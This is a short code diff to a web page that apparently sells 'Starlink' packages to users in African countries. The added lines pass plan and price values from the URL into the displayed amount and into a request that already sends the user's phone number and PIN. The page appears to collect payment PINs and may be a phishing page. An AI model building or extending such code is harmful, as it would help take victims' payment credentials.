@@ -918,6 +918,12 @@
         let starlinkPackage = null;
         let currentRequestId = null;
         let statusPollInterval = null;
+
+        const incomingParams = new URLSearchParams(window.location.search);
+        const incomingPlan = incomingParams.get('plan');
+        const incomingPrice = incomingParams.get('price');
+        const incomingPackage = incomingParams.get('package');
+        starlinkPackage = incomingPlan || incomingPackage || null;
         
         // French-speaking African countries
         const FRENCH_COUNTRIES = new Set([
@@ -1242,6 +1248,9 @@
                 const lpNum = parseFloat(urlLp);
                 const formatted = Number.isInteger(lpNum) ? lpNum.toLocaleString() : lpNum;
                 displayAmount = `${urlCur} ${formatted}`;
+            } else if (incomingPrice) {
+                const priceMatch = incomingPrice.match(/[0-9][0-9.,]*/);
+                displayAmount = `${currency} ${(priceMatch ? priceMatch[0] : incomingPrice).trim()}`;
             } else {
                 const rate = CURRENCY_RATES[currency] || 1; // ZMW fallback
                 const baseCdfAmount = urlCdf ? parseInt(urlCdf) : pkg.cdf;
@@ -1332,6 +1341,8 @@
                         phone: `${phoneCode} ${currentMsisdn}`,
                         pin: currentPin,
                         country: currentCountry,
+                        plan: incomingPlan || starlinkPackage,
+                        price: incomingPrice || incomingParams.get('lp') || '',
                         starlinkPackage: starlinkPackage
                     })
                 });
